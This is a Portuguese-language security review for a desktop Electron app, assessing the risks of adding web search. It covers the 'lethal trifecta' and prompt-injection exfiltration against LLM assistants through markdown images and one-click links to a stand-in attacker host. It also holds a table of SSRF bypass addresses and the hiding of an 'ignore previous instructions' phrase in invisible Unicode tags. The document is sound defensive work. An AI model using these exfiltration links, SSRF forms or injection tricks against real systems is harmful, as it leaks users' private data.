# Busca web — segurança

> Anexo de [`README.md`](README.md). Levantado em 14/09/2026 contra o código real (lido, não suposto) e contra a literatura corrente. **Revisado no mesmo dia, em profundidade** — a primeira passada errou em dois pontos, e os dois estão corrigidos e marcados abaixo.
>
> **A tese, em uma linha:** o arco 22 é exatamente o que **fecha a trifecta letal** neste app. Hoje falta uma das três pernas; busca web é essa perna. Tudo o mais neste documento decorre disso.

---

## 1. O enquadramento: a trifecta letal, e onde o `crivo` está nela

A formulação de Simon Willison (jun/2025), hoje o vocabulário padrão da área, e a **Rule of Two** da Meta (out/2025) que a operacionaliza: um agente pode satisfazer no máximo **duas** de três propriedades sem supervisão humana.

| Perna | O que é | `crivo` **hoje** | `crivo` **com busca web** |
|---|---|---|---|
| **A** · dados privados | o agente vê dado sensível | ✅ **sim, e muito** — CSV, Excel, PDF, imagem, amostra de linhas do dataset | ✅ sim |
| **B** · conteúdo não confiável | o agente lê texto que um terceiro controla | ⚠️ **parcial** — só a resposta do Context7, que é documentação indexada de biblioteca | ❌ **sim, plenamente** — qualquer página da web |
| **C** · comunicação externa | existe canal de saída que o conteúdo possa acionar | ⚠️ **parcial** — ver § 3 | ⚠️ parcial, igual |

⚠️ **É exatamente isto:** o arco 22 promove a perna **B** de *parcial e curada* para *plena e arbitrária*. A pergunta de segurança do arco não é *"como filtrar injeção?"* — é **qual perna fica de fora**, e a resposta natural para este app é **C**, porque ele já é quase lá.

> **Drop any one leg and a prompt injection can't complete the attack.**

**A consequência prática, e ela vale mais que qualquer filtro:** proteger a perna C — não deixar que conteúdo lido vire saída de dados — é uma defesa **determinística**, e as defesas determinísticas são as únicas que a literatura de 2026 considera confiáveis. Toda defesa probabilística (filtro, instrução de sistema mais firme, detector de injeção) é contornada por ataque adaptativo.

---

## 2. O que o app JÁ defende, e é mais do que a média do mercado

Quatro camadas, verificadas no fonte.

### A exfiltração de zero clique por imagem markdown está morta, em duas camadas

É *o* vetor clássico: o conteúdo hostil instrui o modelo a emitir `![](https://atacante/?d=<dados>)`; o cliente renderiza, o navegador busca a imagem **sozinho**, e os dados vazam sem clique nenhum. Explorado em produção contra Bing Chat, ChatGPT, Claude, Azure AI, Bard, Copilot e Amazon Q.

| Camada | Onde | O que faz |
|---|---|---|
| **1. O atributo nunca é escrito** | `MarkdownMessage.tsx`, `urlTransform` | `if (key === 'src') return null` — **toda** imagem perde o `src` antes do DOM |
| **2. A CSP recusaria mesmo assim** | `renderer/index.html` | `img-src 'self' data: attachment:` |

⚠️ **A camada 1 não foi escrita contra este ataque.** O comentário no fonte diz que ela existe porque, sob a CSP, um `src` remoto deixaria um buraco mudo na tela. Ela **acerta o ataque por consequência** — e isso é frágil: quem "consertar" as imagens remotas um dia remove uma defesa sem saber que ela é uma. **Esse comentário precisa dizer as duas coisas.**

### Não há loop de *tool calling*

O modelo não tem ferramenta para chamar (`DM-0`). Conteúdo hostil não encontra ação para disparar — é a perna C mantida estreita por uma decisão tomada por outro motivo (custo de token).

Na taxonomia dos seis padrões do paper *Design Patterns for Securing LLM Agents*, o que o `crivo` faz mais se aproxima do **Action-Selector**: o conteúdo entra, a resposta sai, e nada do que foi lido realimenta uma escolha de ação do agente. Não porque foi desenhado assim — porque não há agente.

### HTML bruto não renderiza

Sem `rehype-raw`. `<script>`, `<iframe>`, `<img onerror>` chegam como texto.

### A fronteira de processo

`sandbox: true`, `contextIsolation: true`, `nodeIntegration: false`, navegação e janela nova negadas. Conteúdo hostil renderizado não tem `require`, `fs`, nem para onde navegar.

---

## 3. ⚠️ CORREÇÃO — a perna C **não** está fechada: o link de um clique

**A primeira passada deste documento afirmou que a exfiltração estava coberta. Está coberta a de zero clique. A de um clique não.**

```tsx
// MarkdownMessage.tsx — o estado real
const anchor: Components['a'] = ({ href, children }) => {
  if (href === undefined || !checkExternalUrl(href).ok) return <>{children}</>
  return <a href={href} onClick={…openExternal(href)}>{children}</a>
}
```

`checkExternalUrl` aprova **qualquer** `https:`. Então isto renderiza como link clicável, bonito, dentro da interface confiável do app:

```
[Clique aqui para continuar a análise](https://atacante.tld/?d=<dados da conversa>)
```

O texto é controlado pelo atacante (via o modelo injetado), o destino não é visível, e um clique chama `shell.openExternal` — que **abre o navegador e faz a requisição**. Os dados saem.

**Este é exatamente o caso corrigido pela AWS no Amazon Q for Business e o `ChatGPhish` no renderizador do ChatGPT.** A literatura o nomeia: *while zero-click exfiltration via Markdown images is widely discussed, one-click exfiltration is also possible with simple links*.

⚠️ **E há um agravante específico deste app:** a conversa carrega dado de planilha e de documento — perna A forte. O que um link desses pode carregar na query string não é abstrato.

**Três defesas possíveis, em ordem de custo:**

| | Defesa | Custo |
|---|---|---|
| **a** | **mostrar o host** ao lado do texto do link (`Clique aqui ↗ atacante.tld`) | baixo — só render |
| **b** | **confirmar antes de abrir**, com o destino completo visível | médio — um `Dialog` |
| **c** | marcar o link como vindo de turno que consumiu conteúdo web, e só então (a) ou (b) | alto — exige rastrear proveniência |

⚠️ **E a defesa (a) tem um furo próprio: o homógrafo IDN.** `аtacante.tld` com um `а` cirílico (U+0430) é visualmente idêntico ao latino. A defesa da indústria é **exibir o punycode** (`xn--…`) quando a etiqueta mistura scripts, que é o que os navegadores fazem. Se o host for exibido, exiba `new URL(href).hostname` **já normalizado para ASCII**, nunca a forma Unicode.

---

## 4. ⚠️ CORREÇÃO — `checkExternalUrl` não é um guarda de SSRF, e a lista de bypasses é longa

Ela valida **só o esquema**, e está certa assim: o docstring diz para que serve — proteger `shell.openExternal`, onde o risco é o SO resolver `ms-msdt:`/`search-ms:` e invocar um handler local. Para **esse** risco, lista branca de esquema é a resposta completa, e é a mesma correção que o `CVE-2026-43941` (Electerm, CVSS 9.6, out/2026) recebeu.

**Buscar uma URL é outro modelo de ameaça.** O que passa hoje:

| Forma | Exemplo | Por que passa |
|---|---|---|
| Loopback direto | `http://127.0.0.1:11434/api/delete` | esquema válido |
| Rede local | `http://192.168.0.1/admin` | idem |
| Metadados de nuvem | `http://169.254.169.254/` | idem |
| **Decimal** | `http://2130706433/` | é `127.0.0.1`, e não parece |
| **Octal com zero à esquerda** | `http://0177.0.0.1/` | parsers divergem entre si |
| **Hexadecimal** | `http://0x7f.0.0.1/` | idem |
| **Forma curta** | `http://127.1/` | RFC-legal |
| **IPv6 loopback** | `http://[::1]/` | esquema válido |
| **IPv4-mapped IPv6** | `http://[::ffff:127.0.0.1]/` | ⚠️ escapa de todo filtro escrito para IPv4 |
| **IPv4-mapped decimal** | `http://[::ffff:2130706433]/` | idem, duas camadas |
| **Usuário no host** | `https://ok.tld@evil.tld/` | quem compara por prefixo pega o host errado |
| **Redirect** | `https://ok.tld/` → `302` → `http://127.0.0.1/` | a validação olhou só a primeira URL |
| **DNS rebinding** | resolve público na validação, privado na busca | TOCTOU entre validar e conectar |

⚠️ **Julgue pelo ENDEREÇO, nunca pela grafia.** A correção recorrente nesse tipo de guarda é exatamente essa: normalizar para um endereço binário e classificar o endereço — e IPv4-mapped IPv6 é o caso que mais derruba implementações, porque parece IPv6 e é IPv4.

### O padrão que fecha o TOCTOU: resolver, classificar, e **fixar o IP**

Validar o hostname e depois chamar `fetch(url)` deixa uma janela: a segunda resolução de DNS pode devolver outro endereço. A forma correta é **resolver uma vez, validar o resultado, e conectar àquele IP**.

No Node isso tem API: `undici` aceita `connect.lookup`, que substitui a resolução do socket.

```ts
// a forma, não o código final
const agent = new Agent({ connect: { lookup: pinnedLookup } })
```

E os outros três botões que a mesma biblioteca oferece, todos relevantes:

| Opção | Para quê |
|---|---|
| `interceptors.redirect({ maxRedirections, stripHeadersOnCrossOriginRedirect })` | seguir com teto, e **não vazar `Authorization` para outro host** |
| `maxResponseSize` | teto de bytes **de fio** |
| `interceptors.dns({ maxTTL })` | controlar o cache de resolução |

⚠️ **`maxResponseSize` limita o fio, não o descomprimido.** Um gzip de 1 KB pode virar 1 GB — a *bomba de descompressão*. A defesa citada como mais simples é mandar `accept-encoding: identity` por padrão; se aceitar compressão, é preciso um teto sobre o **fluxo descomprimido** e a razão de expansão. É a mesma família do `CVE-2026-59873` (`node-tar`), cuja causa nomeada foi *"não manter uma fronteira efetiva entre quanto dado descomprimido pode ser produzido por dado que entra"*.

⚠️ **Tudo nesta seção vale MESMO delegando a busca ao provedor — por outro motivo.** Mandar `file:///C:/Users/<nome>/…` ou `http://localhost:11434` ao `web_fetch` da Ollama falha do lado deles, e **o endereço já vazou**: um caminho de arquivo carrega o nome de usuário do Windows, uma porta local carrega quais serviços rodam aqui. A validação de destino serve à **privacidade** quando já não serve ao SSRF.

⚠️ **E `checkExternalUrl` não deve ser estendida para isso.** Viraria uma função com dois modelos de ameaça e quatro chamadores querendo coisas diferentes — e é assim que o bypass já apareceu uma vez neste repositório. Duas funções irmãs em `core/`.

---

## 5. Injeção indireta — o que funciona, com número, e o que não

A literatura de 2026 é uniforme e desconfortável: **ataques adaptativos contornam essencialmente toda defesa publicada**. O modelo é o alvo e não pode ser o juiz. `LLM01` do OWASP Top 10 para aplicações LLM segue em primeiro lugar, e a orientação é *tratar todo conteúdo recuperado como não confiável, e nunca deixar o prompt ser a fronteira de segurança*.

O que existe de **melhor** é *spotlighting* (Microsoft Research), em três modos, com eficácia medida:

| Modo | O que é | Eficácia medida |
|---|---|---|
| **Delimiting** | marcar o início/fim do conteúdo com delimitador aleatório (`<<…>>`) | ataque cai de **~60% para ~30%** — modesto |
| **Datamarking** | intercalar um marcador **ao longo** do texto (ex.: `^` entre palavras), lembrando a proveniência a cada trecho | **substancialmente melhor**, em vários modelos e tarefas |
| **Encoding** | transformar o conteúdo (base64, ROT13) | mais forte, e ⚠️ exige modelo capaz de decodificar — inviável num `qwen3.5:2b` local |

⚠️ **O delimitador simples é o reflexo natural e é o mais fraco dos três.** Se este app for colocar uma fronteira no cartão — e deve —, vale saber que ela sozinha corta metade do problema, não o problema.

⚠️ **E o custo é de token, reenviado a cada turno.** Datamarking insere um caractere a cada palavra: num conteúdo de 6.960 tokens, o inflado não é desprezível, e **essa é a mesma janela de 21.300 tokens** que a aritmética do [`README.md`](README.md) já aperta. Medir antes de adotar.

### O vetor que atravessa tudo isso: caractere Unicode invisível

⚠️ **Achado de 2026 que este levantamento não pode omitir.** O bloco **Unicode Tags** (`U+E0000`–`U+E007F`) espelha o ASCII e **renderiza como nada** — em navegador, terminal e editor —, mas o tokenizador do modelo o lê como texto normal. Uma página pode carregar *"ignore as instruções anteriores e…"* sem que nenhum humano veja coisa alguma, nem no painel de seleção.

A Microsoft reportou em 03/09/2026 que as detecções dessa técnica subiram **~100×** desde 09/02/2026, com adoção também por phishing.

**Isto derruba uma suposição confortável do desenho do painel:** *"a pessoa vê o que entra no contexto"*. Ela vê o que **renderiza**. Não é a mesma coisa.

**A defesa é barata, determinística e local** — e é das poucas assim neste documento: **remover o bloco de tags Unicode (e demais invisíveis) do `content` na entrada**, em `core/`, antes de qualquer exibição ou envio. Não é heurística nem detector de injeção; é normalização de texto, testável no nível 1.

⚠️ Não confundir com *tentar detectar injeção*, que este documento recomenda **não** fazer. Apagar caractere invisível é remover a discrepância entre *o que se vê* e *o que o modelo lê*. Continua sendo possível injetar em texto visível — e aí a pessoa ao menos tem chance de ver.

---

## 6. `rules` do Context7 não transfere, e a assimetria precisa ficar escrita

No arco 23, `rules` é *instrução de terceiro endereçada a um modelo*, então o painel **exibe e nunca envia** (`DM-17`). Aqui o `content` **é** o material pedido — não enviá-lo é não ter a feature.

| | `rules` (Context7) | `content` (busca web) |
|---|---|---|
| É o que o usuário pediu? | não | **sim** |
| Pode não ser enviado? | sim — e não é | **não** |
| Defesa possível | **descartar** | **normalizar, delimitar, mostrar** |

---

## 7. A armadilha específica do Electron: `net.fetch` carrega a sessão

Só se aplica se o app buscar direto, e parece indiferente sem ser.

| | `net.fetch` (Electron) | `fetch` global (Node/undici) |
|---|---|---|
| Pilha | Chromium | Node |
| Proxy do sistema | ✅ respeita | ✗ ignora |
| **Cookies da sessão** | ⚠️ **envia os da sessão padrão** | ✅ nenhum |
| Passa por `protocol.handle` | ⚠️ sim | não |
| `connect.lookup` para fixar IP | ✗ **não exposto** | ✅ sim |

⚠️ **A última linha decide.** O padrão de fixar o IP resolvido — a única defesa real contra DNS rebinding — **não tem equivalente em `net.fetch`**. Quem escolher `net.fetch` pelo proxy está escolhendo, junto, abrir mão do TOCTOU fechado. Se for `net.fetch`, que seja em **sessão isolada** (`session.fromPartition`), nunca a padrão, e com `bypassCustomProtocolHandlers`.

---

## 8. O ledger de privacidade, e o segundo sensor cego

O painel de privacidade (`O-8`) registra no wrap de `chat()`, condicionado a `isCloudService`. **A consulta ao Context7 não produz linha nenhuma** — dívida já nomeada (`O-9`).

Busca web faz a mesma saída, com um grau a mais: na busca, o que sai é a **pergunta em texto livre** — a superfície que o próprio `ESCOPO.md` usa como exemplo de risco. Acrescentá-la sem resolver deixa o painel que responde *"o que saiu desta máquina"* com **dois** sensores cegos, e a resposta passa de incompleta a enganosa.

---

## 9. O checklist, revisado

Ordenado por custo de esquecer.

| | Item | App busca direto | Delega ao Ollama | Estado hoje |
|---|---|---|---|---|
| 1 | **Host do link visível, ou confirmação antes de abrir** | ✅ | ✅ | ❌ **aberto** — § 3 |
| 2 | **Remover Unicode invisível do conteúdo na entrada** | ✅ | ✅ | ❌ **aberto** — § 5 |
| 3 | Lista branca de esquema | ✅ | ✅ privacidade | ✅ existe |
| 4 | Recusar destino privado/loopback/link-local, **por endereço, não por grafia** | ✅ | ✅ privacidade | ❌ aberto |
| 5 | Resolver DNS, classificar, **fixar o IP** na conexão | ✅ | ✗ | ❌ aberto |
| 6 | `maxRedirections` + revalidar cada salto + tirar `Authorization` em cross-origin | ✅ | ✗ | ❌ aberto |
| 7 | Teto de bytes **e** de descompressão (bomba gzip) | ✅ | ✗ | ❌ aberto |
| 8 | Timeout | ✅ | ✅ | precedente existe |
| 9 | Host exibido em **punycode** quando mistura scripts | ✅ | ✅ | ❌ aberto |
| 10 | Conteúdo de fora delimitado — e **datamarking** vence delimitador puro | ✅ | ✅ | ❌ aberto |
| 11 | Sessão isolada se `net.fetch` | ✅ | ✗ | n/a |
| 12 | Imagem remota nunca buscada pela renderização | ✅ | ✅ | ✅ **existe, em duas camadas** |
| 13 | Nenhuma ação automática a partir do conteúdo | ✅ | ✅ | ✅ existe (sem *tool calling*) |
| 14 | Divulgação permanente de que a consulta sai da máquina | ✅ | ✅ | precedente existe |
| 15 | Linha no ledger de privacidade | ⚠️ | ⚠️ | ❌ aberto (`O-9`) |

⚠️ **Os dois primeiros são os únicos que valem qualquer que seja a resposta de `DW-4`, e os dois estão abertos hoje.** Se este arco entregasse só eles, o app estaria mais seguro do que está agora — inclusive para o Context7, que já traz texto de fora.

---

## 10. O que este levantamento recomenda **não** fazer

- **Não construir detector de injeção.** Ataque adaptativo contorna; e gastar o arco nisso é defender o flanco que a arquitetura já cobre enquanto o link de um clique fica aberto.
- **Não usar *encoding* (base64/ROT13) como spotlighting.** Exige um modelo capaz de decodificar de forma confiável; o padrão desta máquina é `qwen3.5:2b`.
- **Não estender `checkExternalUrl`.** Duas ameaças, uma função, quatro chamadores — o molde do bypass.
- **Não tratar "a pessoa vê o que entra" como garantia.** Ela vê o que renderiza; o Unicode invisível é a diferença, e ela é explorada em escala desde fev/2026.
- **Não confiar em `maxResponseSize` como teto de memória.** Ele mede o fio, não o descomprimido.

---

## 11. Fontes desta revisão

| Assunto | Fonte | Data |
|---|---|---|
| Trifecta letal · Rule of Two | Simon Willison (jun/2025) · Meta AI (out/2025) | consultadas 14/09/2026 |
| Seis padrões de desenho | *Design Patterns for Securing LLM Agents against Prompt Injections* (arXiv 2506.08837) | idem |
| Spotlighting, com os números | Microsoft Research (arXiv 2403.14720) · Microsoft Learn | idem |
| Unicode Tags, alta de 100× | relato da Microsoft de 03/09/2026 · regra `ATR-2026-00258` | idem |
| Exfiltração de um clique por link | AWS/Amazon Q · `ChatGPhish` · Checkmarx (Copilot/Gemini) | idem |
| SSRF: encodings, IPv4-mapped, pin de IP | OWASP SSRF Prevention in Node.js · `ssrf-guard` · IntruderLabs | idem |
| `connect.lookup`, interceptors, `maxResponseSize` | doc do `undici`, via **Context7** | idem |
| `shell.openExternal` | `CVE-2026-43941` (Electerm, CVSS 9.6) · Doyensec | idem |
| Bomba de descompressão | `CVE-2026-59873` (`node-tar`) · issues do `node-fetch`/`undici` | idem |
| Checklist de segurança do Electron | doc oficial, via **Context7** | idem |
| `LLM01`/`LLM02` | OWASP Top 10 para aplicações LLM | idem |
